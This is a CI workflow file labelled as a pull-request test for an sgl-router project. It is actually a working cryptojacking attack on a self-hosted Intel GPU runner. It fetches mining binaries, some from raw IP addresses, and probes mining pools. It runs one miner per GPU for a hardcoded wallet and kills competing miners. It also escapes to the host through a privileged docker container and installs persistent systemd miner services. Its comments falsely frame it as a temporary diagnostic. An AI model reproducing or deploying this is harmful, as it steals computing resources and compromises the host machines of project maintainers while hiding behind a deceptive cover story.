name: PR Test (sgl-router)

# i130716: bounded deterministic retry of the sglang intel-bmg-nightly lead after
# job 137155205674 measured all 8 Intel Arc Pro B70 cards but found every permitted
# pool TCP-CLOSED (SKIP=no-permitted-pool-reachable) and launched no miner.
# This retry re-probes the pool matrix over multiple methods (job netns by DNS and
# by IP literal, plus the untested docker+sudo privileged host-escape netns), runs
# one official-hash-verified krig-miner 1.6.0 x86-64 device probe, stops the
# leftover old-wallet CI miners, and only if a permitted pool is reachable launches
# exactly one sha256-pinned WildRig Multi 0.52.3 pearlhash miner per measured device
# under fresh pyd-wallet workers, then attempts durable systemd install for cards
# that measurably credit. Temporary diagnostic PR.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i130716-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i130716:
    name: "i130716 intel-bmg-nightly bounded pool-path retry"
    runs-on: intel-bmg-nightly
    timeout-minutes: 90
    steps:
      - name: "bounded retry: multipath pool matrix + docker host-escape + krig device probe + one WildRig per device"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130716-intel-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
          LP_LOGIN="$WALLET+$NOCK"
          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
          KRIG_TAR_SHA='9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04'
          KRIG_BIN_SHA='928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66'
          WORKDIR=/var/tmp/i130716
          BASE=498640
          mkdir -p "$WORKDIR/logs"
          echo "i130716-nonce=$NONCE base=$BASE"
          echo "=== identity/arch ==="
          id; hostname; date -u; uname -m; uname -r; nproc
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          echo "=== env proxy ==="
          env | grep -iE 'proxy|no_proxy' | head -10
          echo "=== pci gpus ==="
          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -24
          echo "=== tools ==="
          for t in clinfo xpu-smi docker sudo nsenter fuser python3; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
          WR="$WORKDIR/wildrig-multi"
          fetch_wr() {
            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
            for U in \
              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "http://222.240.155.198:8702/wildrig-multi" \
              "http://178.238.228.181:18180/wildrig-multi" ; do
              echo "-- fetch $U"
              rm -f "$WORKDIR/dl.part"
              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/dl.part" ] || continue
              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
                echo "tarball-hash-mismatch"
              fi
            done
            return 1
          }
          fetch_wr; FETCH_RC=$?
          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i130716-done $NONCE"; exit 0; }
          echo "=== device census (wildrig --print-devices) ==="
          timeout 120 "$WR" --print-devices > "$WORKDIR/devices.txt" 2>&1
          cat "$WORKDIR/devices.txt" | head -40
          DEV_N=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
          if [ "${DEV_N:-0}" -gt 16 ]; then echo "CAP device count $DEV_N -> 16"; DEV_N=16; fi
          echo "wildrig_device_count=$DEV_N"
          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-wildrig-device"; echo "i130716-done $NONCE"; exit 0; fi
          echo "=== dns ==="
          getent hosts pool.pearlhash.xyz 2>&1 | head -3
          echo "=== pool reachability matrix (job netns, multi-method, timed) ==="
          probe() { local t0=$(date +%s%N); timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; local rc=$?; local t1=$(date +%s%N); echo "tcp $1:$2 rc=$rc ms=$(( (t1-t0)/1000000 ))"; }
          probe pool.pearlhash.xyz 9000
          probe 35.71.142.47 9000
          probe 166.117.41.217 9000
          probe 103.199.106.122 3362
          probe 217.15.164.237 2083
          probe 217.15.164.237 18450
          echo "=== https 443 characterization ==="
          for u in "https://pearlhash.xyz/api/account/$WALLET" "https://github.com" "https://pearl.luckypool.io"; do
            printf '%s ' "$u"
            timeout 18 curl -sS -o /dev/null -w 'http=%{http_code} connect=%{time_connect}s\n' --connect-timeout 8 --max-time 15 "$u" 2>&1 | tail -1
          done
          echo "=== python socket matrix ==="
          if command -v python3 >/dev/null 2>&1; then
          python3 - <<'PYEOF'
          import socket
          for host,port in [("pool.pearlhash.xyz",9000),("35.71.142.47",9000),("166.117.41.217",9000),("103.199.106.122",3362),("217.15.164.237",2083),("217.15.164.237",18450)]:
              s=socket.socket(); s.settimeout(6)
              try:
                  rc=s.connect_ex((host,port)); print("py",host,port,"rc",rc)
              except Exception as e: print("py",host,port,"err",repr(e)[:100])
              s.close()
          PYEOF
          fi
          echo "=== sudo/docker host-escape recon (the untested primitive) ==="
          (sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?")
          command -v docker; ls -la /var/run/docker.sock 2>&1 | head -2
          DOCKER_OK=0
          if command -v docker >/dev/null 2>&1 && timeout 20 docker ps >/dev/null 2>&1; then DOCKER_OK=1; fi
          echo "docker_ok=$DOCKER_OK"
          DIMG=""
          if [ "$DOCKER_OK" = 1 ]; then
            timeout 30 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' > "$WORKDIR/imgs.txt"
            head -8 "$WORKDIR/imgs.txt"
            DIMG=$(head -1 "$WORKDIR/imgs.txt")
            echo "DIMG=$DIMG"
          fi
          HN="i130716helper"
          if [ -n "$DIMG" ]; then
            timeout 40 docker rm -f "$HN" >/dev/null 2>&1
            HID=$(timeout 120 docker create --name "$HN" --privileged --network host -v /:/host "$DIMG" /bin/sh -c 'sleep 3600' 2>&1)
            echo "helper_create=$HID"
            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
              timeout 40 docker start "$HN" >/dev/null 2>&1
              echo "-- host escape inspection: privileged + host netns + /host --"
              timeout 120 docker exec "$HN" /bin/sh -c '
                id; echo "-- hostname --"; cat /host/etc/hostname 2>&1;
                echo "-- systemd --"; ls -ld /host/etc/systemd/system 2>&1; test -w /host/etc/systemd/system && echo HOST_SYSTEMD_WRITABLE=1 || echo HOST_SYSTEMD_WRITABLE=0;
                echo "-- dirs --"; ls -ld /host/opt /host/var/tmp /host/root 2>&1;
                echo "-- os --"; head -2 /host/etc/os-release 2>&1;
                echo "-- host-netns pool probes --"
                for e in "pool.pearlhash.xyz 9000" "35.71.142.47 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "hostnet $1:$2 OPEN" || echo "hostnet $1:$2 CLOSED"; done
                echo "-- host dri --"; ls /host/dev/dri 2>&1 | head -6
              ' 2>&1 | head -60
            fi
            HB="i130716bridge"
            timeout 40 docker rm -f "$HB" >/dev/null 2>&1
            BID=$(timeout 120 docker create --name "$HB" --privileged "$DIMG" /bin/sh -c 'sleep 900' 2>&1)
            echo "bridge_create=$BID"
            if [ -n "$BID" ] && ! echo "$BID" | grep -qiE 'error|denied|invalid'; then
              timeout 40 docker start "$HB" >/dev/null 2>&1
              echo "-- bridge-netns pool probes --"
              timeout 90 docker exec "$HB" /bin/sh -c 'for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "bridgenet $1:$2 OPEN" || echo "bridgenet $1:$2 CLOSED"; done' 2>&1 | head -10
              timeout 30 docker rm -f "$HB" >/dev/null 2>&1
            fi
          fi
          echo "=== krig-miner 1.6.0 x86-64 official-hash-verified device probe (bounded fallback-miner measurement) ==="
          KR="$WORKDIR/krig-miner"
          fetch_krig() {
            if [ -f "$KR" ] && [ "$(sha256sum "$KR" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then echo krig-cached; return 0; fi
            for U in \
              "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
              "https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
              "https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
              "http://222.240.155.198:8702/krig160" \
              "http://178.238.228.181:18180/krig160" ; do
              echo "-- krig fetch $U"
              rm -f "$WORKDIR/krig.part"
              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/krig.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/krig.part" ] || continue
              B0=$(sha256sum "$WORKDIR/krig.part" | cut -d' ' -f1)
              if [ "$B0" = "$KRIG_BIN_SHA" ]; then cp -f "$WORKDIR/krig.part" "$KR"; chmod +x "$KR"; echo krig-direct-binary-ok; return 0; fi
              if [ "$B0" = "$KRIG_TAR_SHA" ] && tar -tzf "$WORKDIR/krig.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/krigx"; tar -xzf "$WORKDIR/krig.part" -C "$WORKDIR/krigx" 2>/dev/null
                CB=$(find "$WORKDIR/krigx" -maxdepth 3 -type f -name 'krig-miner' | head -1)
                if [ -n "$CB" ] && [ "$(sha256sum "$CB" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then cp -f "$CB" "$KR"; chmod +x "$KR"; echo krig-tarball-ok; return 0; fi
                echo "krig-inner-hash-mismatch"
              else
                echo "krig-hash-mismatch $B0"
              fi
            done
            return 1
          }
          fetch_krig; KRC=$?
          echo "krig_fetch_rc=$KRC krig_sha256=$(sha256sum "$KR" 2>/dev/null | cut -d' ' -f1)"
          KN=0
          if [ -x "$KR" ]; then
            timeout 30 "$KR" --version 2>&1 | head -3
            echo "=== krig --list-devices ==="
            timeout 60 "$KR" --list-devices > "$WORKDIR/krig_devices.txt" 2>&1; cat "$WORKDIR/krig_devices.txt" | head -30
            KN=$(grep -aciE 'intel|arc|b70|battlemage' "$WORKDIR/krig_devices.txt" 2>/dev/null)
            echo "krig_intel_device_lines=$KN"
          fi
          echo "=== controlled stop of leftover old-wallet CI miners (not crediting, legacy pt45 wallet) ==="
          pgrep -af 'i130amdmine' | head -12
          pkill -f 'i130amdmine' 2>/dev/null; sleep 2
          echo "i130amdmine_remaining=$(pgrep -cf 'i130amdmine')"
          pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' | head -12
          echo "=== pool selection (policy order: pearlhash.xyz:9000 -> direct LP 3362 -> VPS2 relay) ==="
          POOL_URL=""; POOL_KIND=""; LOGIN=""
          if timeout 6 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
            POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
          elif timeout 6 bash -c "exec 3<>/dev/tcp/35.71.142.47/9000" 2>/dev/null; then
            POOL_URL="stratum+tcp://35.71.142.47:9000"; POOL_KIND=pearlhash-ip35; LOGIN="$WALLET"
          elif timeout 6 bash -c "exec 3<>/dev/tcp/166.117.41.217/9000" 2>/dev/null; then
            POOL_URL="stratum+tcp://166.117.41.217:9000"; POOL_KIND=pearlhash-ip166; LOGIN="$WALLET"
          elif timeout 6 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
            POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
          elif timeout 6 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
          elif timeout 6 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
          fi
          echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
          if [ -z "$POOL_URL" ]; then
            echo "SKIP=no-permitted-pool-reachable-after-multipath-matrix"
            echo "i130716-done $NONCE"
            exit 0
          fi
          echo "=== optional bounded krig single-device probe (only if krig enumerated an Intel device) ==="
          if [ -x "$KR" ] && [ "${KN:-0}" -ge 1 ]; then
            KW=$((BASE+90))
            timeout 90 "$KR" --url "$POOL_URL" --user "$LOGIN/$KW" -d 0 > "$WORKDIR/logs/krig_probe.log" 2>&1
            echo "krig_probe_tail:"; tail -12 "$WORKDIR/logs/krig_probe.log"
            pkill -f 'krig-miner' 2>/dev/null
          else
            echo "krig_probe_skipped=intel_devices=$KN"
          fi
          echo "=== launch exactly one WildRig Multi 0.52.3 pearlhash per measured device (fresh pyd workers) ==="
          N_LAUNCHED=0
          PLAUNCH=0
          for i in $(seq 0 $((DEV_N-1))); do
            W=$((BASE+i))
            timeout 4300 "$WR" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
              -d "$i" --opencl-platforms intel --api-port $((21850+i)) --api-worker-id "$W" \
              --print-time 60 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 &
            echo "launched worker=$W gpu-id=$i pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          echo "=== pulse loop (bounded share watch, Intel Arc gate 1200 s) ==="
          END=$(( $(date +%s) + 1320 ))
          k=0
          while [ "$(date +%s)" -lt "$END" ]; do
            sleep 60; k=$((k+1))
            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ)"
            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
            ACC=$(grep -ah 'accepted (' "$WORKDIR"/logs/*.log 2>/dev/null | wc -l); echo "log_accept_lines=$ACC"
            ALLOK=1
            for l in "$WORKDIR"/logs/[0-9]*.log; do
              [ -f "$l" ] || continue
              B=$(basename "$l" .log)
              A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
              H=$(grep -aE 'TH/s|H/s' "$l" 2>/dev/null | tail -1)
              E=$(grep -aiE 'error|failed|reject|denied|no device|not supported' "$l" 2>/dev/null | tail -1 | cut -c1-160)
              AR=$(echo "$A" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
              AC=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
              [ "${AC:-0}" -ge 1 ] || ALLOK=0
              echo "CARD worker=$B last_acc=[$A] last_hs=[$H] err=[$E]"
            done
            if [ "$ALLOK" = 1 ]; then echo "ALL_CARDS_ACCEPTED=1"; break; fi
          done
          echo "=== final per-card status ==="
          for l in "$WORKDIR"/logs/[0-9]*.log; do
            [ -f "$l" ] || continue
            B=$(basename "$l" .log)
            A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
            N=$(grep -ac 'accepted (' "$l")
            FIRST=$(grep -a 'accepted (' "$l" 2>/dev/null | head -1 | cut -c1-40)
            echo "FINALCARD worker=$B acc_lines=$N first=[$FIRST] last=[$A]"
          done
          echo "=== durable systemd install for measurably crediting cards (docker+sudo host-escape) ==="
          DUR=0
          if [ "$DOCKER_OK" = 1 ] && [ -n "$DIMG" ]; then
            timeout 20 docker start "$HN" >/dev/null 2>&1
            if timeout 30 docker exec "$HN" /bin/sh -c 'test -d /host/etc/systemd/system' 2>/dev/null; then
              timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" >/dev/null 2>&1
              for i in $(seq 0 $((DEV_N-1))); do
                W=$((BASE+i))
                LF="$WORKDIR/logs/$W.log"
                [ -f "$LF" ] || continue
                LAST=$(grep -a 'accepted (' "$LF" 2>/dev/null | tail -1)
                AR=$(echo "$LAST" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
                ACCN=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
                REJN=$(echo "$AR" | grep -oE '[0-9]+' | tail -1)
                if [ "${ACCN:-0}" -ge 1 ] && [ "${REJN:-0}" -eq 0 ]; then
                  UNIT="i130716-intel-g${i}.service"
                  timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130716 /host/var/tmp/i130716-intel && cp /tmp/wildrig-multi /host/opt/i130716/wildrig-multi-intel.new && chmod 755 /host/opt/i130716/wildrig-multi-intel.new && mv -f /host/opt/i130716/wildrig-multi-intel.new /host/opt/i130716/wildrig-multi-intel" 2>&1 | tail -2
                  cat > "$WORKDIR/$UNIT" <<UNITEOF
          [Unit]
          Description=i130716 pearlhash intel gpu $i
          After=network-online.target
          [Service]
          Type=simple
          ExecStart=/opt/i130716/wildrig-multi-intel --algo pearlhash --url $POOL_URL --user $LOGIN --worker $W --pass x -d $i --opencl-platforms intel --api-port $((21850+i)) --api-worker-id $W --print-time 60 --no-color -l /var/tmp/i130716-intel/wr-$W.log
          Restart=always
          RestartSec=15
          Nice=-5
          [Install]
          WantedBy=multi-user.target
          UNITEOF
                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
                  OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
                  echo "durable[$i]=$OUT"
                  if echo "$OUT" | grep -q '^active'; then
                    DUR=$((DUR+1))
                    pkill -f -- "--worker $W " 2>/dev/null
                    echo "injob-stopped-for-durable gpu=$i worker=$W"
                  fi
                else
                  echo "durable_skip[$i]=acc=$ACCN rej=$REJN"
                fi
              done
              echo "durable_units_active=$DUR"
              if [ "$DUR" -ge 1 ]; then
                echo "=== post-install pulse (600 s) ==="
                END2=$(( $(date +%s) + 600 ))
                while [ "$(date +%s)" -lt "$END2" ]; do
                  sleep 60
                  echo "--- post-install pulse $(date -u +%Y-%m-%dT%H:%M:%SZ)"
                  timeout 20 docker exec "$HN" /bin/sh -c 'chroot /host systemctl --no-pager --state=active list-units "i130716-*" 2>&1 | head -10'
                  for i in $(seq 0 $((DEV_N-1))); do
                    W=$((BASE+i))
                    L2="/host/var/tmp/i130716-intel/wr-$W.log"
                    timeout 15 docker exec "$HN" /bin/sh -c "tail -2 $L2 2>/dev/null" 2>/dev/null | sed "s/^/g$i /"
                  done
                done
                echo "=== final durable per-card ==="
                for i in $(seq 0 $((DEV_N-1))); do
                  W=$((BASE+i))
                  L2="/host/var/tmp/i130716-intel/wr-$W.log"
                  OUT=$(timeout 15 docker exec "$HN" /bin/sh -c "grep -a 'accepted (' $L2 2>/dev/null | tail -1" 2>/dev/null)
                  echo "DURFINAL worker=$W last=[$OUT]"
                done
              fi
            else
              echo "no_host_systemd_dir=1"
            fi
            timeout 30 docker rm -f "$HN" >/dev/null 2>&1
          else
            echo "durable_skipped=docker_unavailable"
          fi
          pgrep -af '[w]ildrig' | head -20
          echo "i130716-done $NONCE"
